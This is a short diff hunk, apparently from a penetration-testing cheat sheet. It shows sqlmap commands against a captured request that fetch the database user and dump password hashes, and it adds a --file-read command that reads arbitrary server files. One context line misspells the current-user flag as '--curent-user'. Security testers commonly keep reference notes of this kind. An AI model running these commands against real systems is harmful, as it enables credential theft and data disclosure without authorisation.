@@ -3434,6 +3434,9 @@ python /path/to/sqlmap -r req.txt --curent-user
 
 # if run as root, dump password hashes for DB
 python /path/to/sqlmap -r req.txt --passwords
+
+# file read
+python /path/to/sqlmap -r req.txt --file-read '/path/to/file/here'
 ```
 
 
